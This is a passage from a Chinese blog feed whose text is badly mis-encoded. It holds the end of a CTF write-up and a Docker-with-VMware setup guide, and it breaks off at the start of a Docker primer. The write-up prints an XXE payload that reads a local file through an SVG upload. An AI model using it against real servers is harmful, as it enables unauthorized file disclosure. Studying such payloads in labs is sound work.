rel="noopener">https://www.cnblogs.com/backlion/p/9302528.html</a></p><p><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></p><p>ä¸Šä¼ phpä¸€å¥è¯è¿”å›é”™è¯¯ä¿¡æ¯</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">For Security, our system do not allow upload xml file from now on.<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span>Other file like png,jpg,rar,zip...etc is welcome<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ä¸Šä¼ å›¾ç‰‡ç­‰æ–‡ä»¶æ ¼å¼,æ°å¥½xmlå¯ä»¥è§£æsvg</p><p><strong>payload</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE message [</span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT message ANY&gt;</span></span><br><span class="line"><span class="meta">  &lt;!ENTITY % para1 SYSTEM "file:///hhh_Th1s_y0uR_f14g"&gt; //æ ¹æ®æŠ¥é”™å›æ˜¾æ‰¾åˆ°flagè·¯å¾„</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % para '</span></span><br><span class="line"><span class="meta">&lt;!ENTITY &amp;#x25; para2 "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM</span></span><br><span class="line"><span class="meta">&amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;"&gt;</span></span><br><span class="line"><span class="meta">&amp;#x25;para2;</span></span><br><span class="line"><span class="meta">'&gt;</span></span><br><span class="line"><span class="meta">%para;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>10<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„æŒ‡å®šMIMEç±»å‹ Content-Type: text/xml</p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="MaybeBase"><a href="#MaybeBase" class="headerlink" title="MaybeBase"></a>MaybeBase</h3><p><code>YMFZZTY0D3RMD3RMMTIZ è¿™ä¸€ä¸²åˆ°åº•æ˜¯ä»€ä¹ˆï¼ï¼ï¼ï¼ä¸ºä»€ä¹ˆè¿™ä¹ˆåƒbase32å´ä¸æ˜¯ï¼ï¼ï¼æ˜æ–‡çš„md5å€¼ä¸º16478a151bdd41335dcd69b270f6b985</code></p><p>å¯ä»¥ç”¨base64ä¸åŒºåˆ†å¤§å°å†™å·¥å…·ç›´æ¥çˆ†å‡ºæ‰€æœ‰å¯èƒ½çš„flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64,sys,os,redef,re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(res,arr,pos)</span>:</span></span><br><span class="line">    res.append(<span class="string">''</span>.join(arr))</span><br><span class="line">    i=pos</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(i,len(arr)):</span><br><span class="line">        <span class="keyword">if</span> arr[i]&lt;=<span class="string">'Z'</span> <span class="keyword">and</span> arr[i]&gt;=<span class="string">'A'</span>:</span><br><span class="line">            arr[i]=arr[i].lower()</span><br><span class="line">            dfs(res,arr,i+<span class="number">1</span>)</span><br><span class="line">            arr[i]=arr[i].upper()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'+'</span> + <span class="string">'-'</span> * <span class="number">50</span> + <span class="string">'+'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">u'\t  base64å¤§å°å†™è½¬æ¢è§£å¯†å·¥å…·'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'+'</span> + <span class="string">'-'</span> * <span class="number">50</span> + <span class="string">'+'</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'ç”¨æ³•ï¼š'</span> + os.path.basename(sys.argv[<span class="number">0</span>]) + <span class="string">u' base64å¯†æ–‡'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'å®ä¾‹ï¼š'</span> + os.path.basename(sys.argv[<span class="number">0</span>]) + <span class="string">' "AGV5IULSB3ZLVSE="'</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    arr = list(sys.argv[<span class="number">1</span>])</span><br><span class="line">    res = []</span><br><span class="line">    dfs(res, arr, <span class="number">0</span>)</span><br><span class="line">    res_decode = map(base64.b64decode, res)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res_decode:</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">r'\\x'</span>, repr(i)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> i</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">base64wtfwtf123</span><br><span class="line">base64wtfwtL123</span><br><span class="line">base64wtLwtf123</span><br><span class="line">base64wtLwtL123</span><br><span class="line">baYe64wtfwtf123</span><br><span class="line">baYe64wtfwtL123</span><br><span class="line">baYe64wtLwtf123</span><br><span class="line">baYe64wtLwtL123</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>å¾—åˆ°base64wtfwtf123çš„md5å€¼ä¸º16478a151bdd41335dcd69b270f6b985<br>flagå°±æ˜¯è¿™ä¸ªäº†ï¼</p><hr><p>åˆ†äº«ä¸€ä¸ªè‡ªå­˜CTFé¢˜çš„åœ°å€,å¦‚æœéœ€è¦è¯·åŠæ—¶è‡ªå–,åœ°å€æŒ‚äº†å‘ä¸ªé‚®ä»¶ç»™æˆ‘:)</p><p>-=&gt; <a href="https://jxjjxy-my.sharepoint.com/:f:/g/personal/v0cjich_p_t_odmail_cn/EtMZ3q8LTIFAkS4Dcp8XAn8BDXTHqlJuV8S6bRu2mZgJHA?e=cT9hk2" target="_blank" rel="noopener">OneDrive cloud</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å¤§ä¸‰æ¥æ£’å†²åˆº,è¿™ä¸€æˆ˜æ— ç–‘éœ€è¦å–å¾—å¥½çš„æˆç»©ï¼Œä¸ºåè¾ˆæ ‘ç«‹æ¦œæ ·ï¼ä¸è¿‡ç¦å»ºçœâ€é»‘ç›¾æ¯â€å¤§å¤šéƒ½æ˜¯åŸºç¡€å…¥é—¨é¢˜,å°±ç®—èµ¢äº†,ä¹Ÿä¸èƒ½å¤ªå¾—æ„XD è·¯è¿˜é•¿~ä»»é‡è€Œ
      
    
    </summary>
    
      <category term="Writeup" scheme="http://qymua.com/categories/Writeup/"/>
    
    
      <category term="web,Re,crypto" scheme="http://qymua.com/tags/web-Re-crypto/"/>
    
  </entry>
  
  <entry>
    <title>æµ…è°ˆDocker-for-Windowsä¸VMwareå…±å­˜</title>
    <link href="http://qymua.com/2019/08/22/%E6%B5%85%E8%B0%88Docker-for-Windows%E4%B8%8EVMware%E5%85%B1%E5%AD%98/"/>
    <id>http://qymua.com/2019/08/22/æµ…è°ˆDocker-for-Windowsä¸VMwareå…±å­˜/</id>
    <published>2019-08-22T05:58:52.000Z</published>
    <updated>2019-08-23T09:37:42.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è®°"><a href="#å‰è®°" class="headerlink" title="å‰è®°"></a>å‰è®°</h1><hr><p>æœ€è¿‘ä½¿ç”¨<code>docker</code>æ¯”è¾ƒå¤šï¼Œä½†æ˜¯å¶ç„¶é—´ä½¿ç”¨VMçš„æ—¶å€™é‡åˆ°äº†å…¼å®¹æ€§å†²çªé—®é¢˜</p><p>ä½¿ç”¨è¿‡<code>VMware WorkStation</code>çš„æœ‹å‹åº”è¯¥çŸ¥é“ï¼Œ<code>vm</code>æ— æ³•ä¸<code>hyper-v</code>å…±å­˜ã€‚é‚£ä¹ˆå¦‚æœæˆ‘çš„ç”µè„‘å·²ç»å®‰è£…å’Œä½¿ç”¨VMï¼Œå¦‚ä½•æ‰èƒ½ä½¿ç”¨<code>Docker for Windows</code>å‘¢ï¼Œå¦‚æœè¦åŒæ—¶ä½¿ç”¨å°±åªèƒ½æ”¾å¼ƒhyper-vå•¦</p><p><code>Docker for Windows</code> ä¸åŒäº <code>Docker Toolbox</code>ã€‚Docker for Windows å¯¹ç³»ç»Ÿçš„è¦æ±‚è‡³å°‘ä¸º<code>Windows 10</code>ä¸“ä¸šç‰ˆï¼Œå› ä¸ºå®ƒéœ€è¦<code>Hyper-V</code>çš„æ”¯æŒï¼Œè€ŒDockbox Toolboxä½¿ç”¨<code>Oracle Virtual Box</code>è€Œä¸æ˜¯Hyper-V . </p><p>ä½†æ˜¯æˆ‘ä¸å¸Œæœ›<code>docker-machine</code>ä½¿ç”¨<code>Virtual Box</code>ï¼Œç›¸å…³é…ç½®æˆ‘æ˜¯å‚è€ƒ<code>Toolbox</code>ï¼Œé“ç†æ˜¯ä¸€æ ·çš„XD</p><h1 id="å®‰è£…Docker-for-Windows"><a href="#å®‰è£…Docker-for-Windows" class="headerlink" title="å®‰è£…Docker for Windows"></a>å®‰è£…Docker for Windows</h1><h2 id="ä¸‹è½½Docker-for-Windows"><a href="#ä¸‹è½½Docker-for-Windows" class="headerlink" title="ä¸‹è½½Docker for Windows"></a>ä¸‹è½½Docker for Windows</h2><p>ä»è¿™ä¸ªåœ°å€ä¸‹è½½å¹¶è¿›è¡Œå®‰è£…ï¼š<a href="https://download.docker.com/win/stable/Docker%20for%20Windows%20Installer.exe" target="_blank" rel="noopener">docker for windows</a></p><p>å®‰è£…è¿‡ç¨‹ä¸­å¦‚æœé‡åˆ°ç³»ç»Ÿç‰ˆæœ¬ä¸é€‚é…çš„é—®é¢˜å¯ä»¥ä¿®æ”¹<code>EditionID</code>çš„å˜é‡å€¼ä¸º<code>Profession</code> ï¼Œæ³¨å†Œè¡¨åœ°å€å¦‚ä¸‹ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE<span class="tag">\<span class="name">SOFTWARE</span></span><span class="tag">\<span class="name">Microsoft</span></span><span class="tag">\<span class="name">Windows</span></span> NT<span class="tag">\<span class="name">CurrentVersion</span></span></span><br></pre></td></tr></table></figure><blockquote><p>å®‰è£…æˆåŠŸåä¸è¦å¯åŠ¨æœåŠ¡</p></blockquote><h2 id="å…³é—­Hyper-v"><a href="#å…³é—­Hyper-v" class="headerlink" title="å…³é—­Hyper-v"></a>å…³é—­Hyper-v</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /<span class="keyword">set</span> hypervisorlaunchtype <span class="comment">off</span></span><br></pre></td></tr></table></figure><p>ç®¡ç†å‘˜èº«ä»½è¿è¡ŒæˆåŠŸåé‡å¯è®¡ç®—æœº</p><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><p><strong>1ã€ä¸‹è½½æœ€æ–°ç‰ˆæœ¬boot2docker.iso</strong></p><p>ä¸‹è½½åœ°å€ <a href="https://github.com/boot2docker/boot2docker/releases" target="_blank" rel="noopener">https://github.com/boot2docker/boot2docker/releases</a></p><p>ç„¶åå°† boot2docker.iso æ”¾åœ¨ <code>C:\Users\&lt;ç”¨æˆ·å&gt;\.docker\machine\cache\</code>ï¼Œæ–‡ä»¶å¤¹ä¸å­˜åœ¨å°±è‡ªå·±å»ºç«‹</p><p><strong>2ã€ä¸‹è½½ VMware Workstation é©±åŠ¨</strong></p><p>ä»è¿™é‡Œä¸‹è½½ <a href="https://github.com/pecigonzalo/docker-machine-vmwareworkstation/releases/" target="_blank" rel="noopener">https://github.com/pecigonzalo/docker-machine-vmwareworkstation/releases/</a> </p><p>æœ€æ–°ç‰ˆçš„vmé©±åŠ¨ã€‚æ­¤é©±åŠ¨éå®˜æ–¹å¼€å‘ï¼Œä½†æ˜¯ä¹Ÿåœ¨å®˜æ–¹çš„æ–‡æ¡£ä¸­æœ‰é“¾æ¥</p><p>ç„¶åå°† <code>docker-machine-driver-vmwareworkstation.exe</code>å¤åˆ¶åˆ° <code>C:\Program Files\Docker\Docker\resources\bin</code> ä¸‹ï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566451983155.png" alt></p><h2 id="å®‰è£…Docker-Machine"><a href="#å®‰è£…Docker-Machine" class="headerlink" title="å®‰è£…Docker Machine"></a>å®‰è£…Docker Machine</h2><p>Docker Machine æ˜¯ Docker å®˜æ–¹æä¾›çš„ä¸€ä¸ªå·¥å…·ï¼Œå®ƒå¯ä»¥å¸®åŠ©æˆ‘ä»¬åœ¨è¿œç¨‹çš„æœºå™¨ä¸Šå®‰è£… Dockerï¼Œæˆ–è€…åœ¨è™šæ‹Ÿæœº host ä¸Šç›´æ¥å®‰è£…è™šæ‹Ÿæœºå¹¶åœ¨è™šæ‹Ÿæœºä¸­å®‰è£… Dockerã€‚æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ docker-machine å‘½ä»¤æ¥ç®¡ç†è¿™äº›è™šæ‹Ÿæœºå’Œ Dockerã€‚ä¸‹é¢æ˜¯æ¥è‡ª Docker Machine å®˜æ–¹æ–‡æ¡£çš„ä¸€å¼ å›¾ï¼Œå¾ˆå½¢è±¡å“¦ï¼</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566532111553.png" alt></p><p>Docker Machine çš„å®‰è£…ååˆ†ç®€å•ï¼Œå¦‚æœåœ¨è¿œç¨‹ä¸»æœºä¸­ç›´æ¥æŠŠå¯æ‰§è¡Œæ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°å°±å¯ä»¥äº†ã€‚</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -L <span class="symbol">https:</span>/<span class="regexp">/github.com/docker</span><span class="regexp">/machine/releases</span><span class="regexp">/download/v</span><span class="number">0</span>.<span class="number">12.0</span>/docker-machine-<span class="string">`uname -s`</span>-<span class="string">`uname -m`</span> &gt; <span class="regexp">/tmp/docker</span>-machine</span><br><span class="line">$ chmod +x /tmp/docker-machine</span><br><span class="line">$ sudo mv /tmp/docker-machine /usr/local/bin/docker-machine</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ v0.12.0 æ˜¯æœ€æ–°çš„ç‰ˆæœ¬ã€‚å½“ç„¶ Docker Machine æ˜¯ä¸ªå¼€æºé¡¹ç›®ï¼Œä½ å¯ä»¥é€‰æ‹©å®‰è£…ä¸åŒçš„ç‰ˆæœ¬ï¼Œæˆ–è€…æ˜¯è‡ªè¡Œç¼–è¯‘ã€‚å› ä¸ºæˆ‘ä¸å¤ªéœ€è¦åœ¨è¿œç¨‹æ­å»ºdockerï¼Œæ‰€ä»¥å°±ä¸è¿‡å¤šä»‹ç»äº†XDï¼Œä¸‹é¢è¿˜æ˜¯ç»§ç»­æ­£é¢˜</p><p><strong>0.é‡ç½®docker-machineé»˜è®¤ä½ç½®</strong></p><p>æ·»åŠ <code>MACHINE_STORAGE_PATH</code>ç¯å¢ƒå˜é‡ï¼Œåœ°å€è®¾ä¸ºä½ å¸Œæœ›å­˜å‚¨çš„ä½ç½®ï¼Œé‡å¯ç³»ç»Ÿ</p><blockquote><p>å¦‚æœä½ ä¸æƒ³å ç”¨å¤ªå¤šç³»ç»Ÿç›˜ç©ºé—´ï¼Œå»ºè®®æ”¹ä¸€ä¸‹ï¼Œå¦å¤–æœ‰å¯èƒ½é‡åˆ°sshè¯ä¹¦æ ¡éªŒé—®é¢˜ï¼Œä¸èƒ½ç¡®å®šçœŸæ­£çš„åŸå› ï¼Œå¦‚æœè¿™ä¸ªæ–¹æ¡ˆä½ ä¹Ÿå¤±æ•ˆäº†ï¼Œé‚£ä¹ˆè¯·æ”¹å›é»˜è®¤çš„åœ°å€<code>.docker/machine</code>ç›®å½•ä¸‹</p><p>å¹¶ä¸”å»ºè®®ä½ åœ¨å®ä¾‹å®‰è£…æˆåŠŸåï¼Œæ›´æ”¹è™šæ‹Ÿæœºçš„å·¥ä½œæ–‡ä»¶ï¼Œä¸€æ ·å¯ä»¥è§£å†³å ç”¨ç³»ç»Ÿç©ºé—´çš„é—®é¢˜ğŸ˜</p></blockquote><p><strong>1ã€æ‰“å¼€VMware Workstation</strong></p><p>è¿™ä¸€æ­¥æ˜¯å¿…é¡»çš„ï¼VMç‰ˆæœ¬å¿…é¡»å¤§äº10</p><p><strong>2ã€å®‰è£…Docker-dev</strong></p><p>æ‰“å¼€cmdï¼Œæ‰§è¡Œå‘½ä»¤</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-machine <span class="built_in">create</span> <span class="comment">--driver=vmwareworkstation Docker-dev </span></span><br><span class="line">//docker-devå®é™…ä¸Šæ˜¯è™šæ‹Ÿæœºçš„åç§°ï¼Œå¯è‡ªå®šä¹‰</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566543018940.png" alt></p><p><strong>3ã€éªŒè¯å®‰è£…</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-machine <span class="keyword">ls</span></span><br></pre></td></tr></table></figure><p>ä¼šå‡ºç°çœ‹åˆ°åˆšåˆšå®‰è£…çš„<code>docker-dev</code>å®ä¾‹</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566452235705.png" alt></p><p>å¦‚æœåˆ—è¡¨æœ‰ä¹‹å‰å®‰è£…å¤±è´¥æˆ–è€…æ—§çš„devï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤æ¸…é™¤</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-machine rm -f  <span class="tag">&lt;<span class="name">NAME</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>4ã€æ¿€æ´»å®ä¾‹</strong></p><p>æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker-machine env Docker-dev</span></span><br></pre></td></tr></table></figure><p>ä¼šå‡ºç°è¦ä½ é…ç½®çš„ç¯å¢ƒå˜é‡ï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566452381741.png" alt></p><p>ä¾æ¬¡æ·»åŠ ç¯å¢ƒå˜é‡å³å¯</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566452429851.png" alt></p><p><strong>5ã€éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸ</strong></p><p><strong>ç™»å½•devå®ä¾‹</strong></p><p>ä½¿ç”¨å‘½ä»¤ç™»å½•ï¼š</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker-machine ssh Docker-dev</span></span><br></pre></td></tr></table></figure><p>å‡ºç°å¦‚ä¸‹è¡¨ç¤ºæˆåŠŸï¼š</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566452613983.png" alt></p><h2 id="æ”¶å°¾å·¥ä½œ"><a href="#æ”¶å°¾å·¥ä½œ" class="headerlink" title="æ”¶å°¾å·¥ä½œ"></a>æ”¶å°¾å·¥ä½œ</h2><p><strong>1ã€é…ç½®åŠ é€Ÿå™¨</strong></p><p>é€šè¿‡å‘½ä»¤ç™»å½•docker-machine</p><p>æŒ‰ç…§åŠ é€ŸæœåŠ¡æä¾›å•†çš„æ•™ç¨‹æ‰§è¡Œå‘½ä»¤å³å¯</p><p>æœ¬è´¨ä¸Šå°±æ˜¯ </p><p>æ–°å»ºæ–‡ä»¶ <code>vi /etc/docker/daemon.json</code></p><p>è¾“å…¥ä»¥ä¸‹å†…å®¹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"registry-mirrors"</span>: [<span class="string">"ä½ çš„åŠ é€Ÿå™¨åœ°å€"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿å­˜é‡å¯è™šæ‹Ÿæœºå³å¯</p><p>ä¸ºäº†æ–¹ä¾¿ç®¡ç†ï¼Œä½ è¿˜å¯ä»¥åœ¨VMware ä¸­æ·»åŠ ä½ åˆšåˆšåˆ›å»ºçš„<code>Docker-dev</code></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566453255780.png" alt></p><p><strong>2.sshè¿æ¥æ–¹å¼</strong></p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæ¨èä½¿ç”¨ <code>docker-machine ssh default</code> è¿›è¡Œç™»å½•ï¼Œä¸éœ€è¦è¾“å…¥å¯†ç ã€‚<code>default</code> æ˜¯é»˜è®¤çš„ <code>machine</code> åå­—ã€‚</p><p>åœ¨ <code>boot2docker</code> ä¸­ï¼Œé»˜è®¤çš„ç”¨æˆ·åå’Œå¯†ç æ˜¯ï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">user:</span> docker</span><br><span class="line"><span class="symbol">pass:</span> tcuser</span><br></pre></td></tr></table></figure><p>ç™»å½•æ–¹æ³•ï¼š</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ssh docker<span class="meta">@localhost</span> -p <span class="number">2022</span></span><br><span class="line">docker<span class="meta">@localhost</span>'s password: tcuser</span><br><span class="line">                        <span class="comment">##        .</span></span><br><span class="line">                  <span class="comment">## ## ##       ==</span></span><br><span class="line">               <span class="comment">## ## ## ##      ===</span></span><br><span class="line">           /<span class="string">""""""</span><span class="string">""""""</span><span class="string">""""\___/ ===</span></span><br><span class="line"><span class="string">      ~~~ &#123;~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~</span></span><br><span class="line"><span class="string">           \______ o          __/</span></span><br><span class="line"><span class="string">             \    \        __/</span></span><br><span class="line"><span class="string">              \____\______/</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘å°±èƒ½å¾ˆæ–¹ä¾¿çš„ç®¡ç†docker</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566532408512.png" alt></p><p><strong>3ã€å…³é—­Docker Desktop æœåŠ¡</strong></p><p>ç”±äºæ²¡æœ‰ä½¿ç”¨<code>hyper-v</code> æ‰€ä»¥æœ¬åœ°æ²¡å¿…è¦èµ·è¿™ä¸ªæœåŠ¡ï¼Œå¯ä»¥æŠŠå¼€æœºè‡ªå¯é¡¹å»æ‰</p><p>æ¯æ¬¡ä½¿ç”¨çš„æ—¶å€™å¼€å¯è™šæ‹ŸæœºDocker-devå³å¯</p><p>ç”¨æ³•éƒ½ä¸€æ ·ï¼Œåœ¨vscodeä¸­ä¾ç„¶æ­£å¸¸è¿æ¥ï¼Œåªæ˜¯åœ¨ç»ˆç«¯ä½¿ç”¨çš„æ—¶å€™è¦sshè¿æ¥Docker-devè€Œå·²</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566454036757.png" alt></p><blockquote><p>æœç„¶è¿˜æ˜¯å…¥æ‰‹macæ˜¯æœ€é«˜æ•ˆçš„XD èŠ±é’±çœå¿ƒ ï¼</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å‰è®°&quot;&gt;&lt;a href=&quot;#å‰è®°&quot; class=&quot;headerlink&quot; title=&quot;å‰è®°&quot;&gt;&lt;/a&gt;å‰è®°&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;æœ€è¿‘ä½¿ç”¨&lt;code&gt;docker&lt;/code&gt;æ¯”è¾ƒå¤šï¼Œä½†æ˜¯å¶ç„¶é—´ä½¿ç”¨VMçš„æ—¶å€™é‡åˆ°äº†å…¼å®¹æ€§å†²çªé—®é¢˜&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨è¿‡&lt;code
      
    
    </summary>
    
      <category term="Docker" scheme="http://qymua.com/categories/Docker/"/>
    
    
      <category term="docker" scheme="http://qymua.com/tags/docker/"/>
    
      <category term="Hyper-v" scheme="http://qymua.com/tags/Hyper-v/"/>
    
      <category term="VMware" scheme="http://qymua.com/tags/VMware/"/>
    
  </entry>
  
  <entry>
    <title>Dockerå…¥é—¨ä¹‹åè¡€æ€»ç»“</title>
    <link href="http://qymua.com/2019/08/22/Docker%E5%85%A5%E9%97%A8%E4%B9%8B%E5%90%90%E8%A1%80%E6%80%BB%E7%BB%93/"/>
    <id>http://qymua.com/2019/08/22/Dockerå…¥é—¨ä¹‹åè¡€æ€»ç»“/</id>
    <published>2019-08-21T16:54:56.000Z</published>
    <updated>2019-08-25T06:47:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿›å…¥è¿™ä¸ªåœˆå­æŒºä¹…äº†ï¼Œè¿˜æ²¡ç¢°è¿‡dockerï¼Œè¶ç€æš‘å‡é—²å¾—æ…Œï¼Œæ‰“ä¸€æ³¢åŸºç¡€XD </p><p>ğŸ˜„dockeræ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œåœ¨CTFæ¯”èµ›ä¸­æˆ‘ä»¬å¯ä»¥ç»å¸¸é‡åˆ°é€šè¿‡dockeréƒ¨ç½²çš„webï¼Œæˆ–è€…Pwnç¯å¢ƒï¼ŒåŒæ ·æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†ä¸€äº›æœåŠ¡éƒ¨ç½²åœ¨dockeré‡Œé¢ï¼Œç®¡ç†æ–¹ä¾¿ï¼Œå¹¶ä¸”è¾ƒä¸ºå®‰å…¨ã€‚</p><p>è´´å‡ ä¸ªå­¦ä¹ ç½‘å€ï¼š<a href="https://registry.hub.docker.com/search?q=library" target="_blank" rel="noopener">Docker Hub</a> ã€<a href="http://www.docker.org.cn/index.html" target="_blank" rel="noopener">dockerä¸­æ–‡ç¤¾åŒº</a>ã€<a href="https://docs.docker.com" target="_blank" rel="noopener">docker dcos</a>ã€<a href="https://yeasy.gitbooks.io/docker_practice/" target="_blank" rel="noopener">dockerä»å…¥é—¨åˆ°å®è·µ(è¶…å…¨)</a></p><p>æ¥ä¸‹æ¥åˆ†ä¸‰ä¸ªéƒ¨åˆ†å…¥é—¨dockerï¼šdockeræ¦‚å¿µã€dockerä½¿ç”¨ã€docker-CTFè¿ç”¨</p><h1 id="Dockeræ¦‚å¿µ"><a href="#Dockeræ¦‚å¿µ" class="headerlink" title="Dockeræ¦‚å¿µ"></a>Dockeræ¦‚å¿µ</h1><hr><blockquote><p><strong>Docker 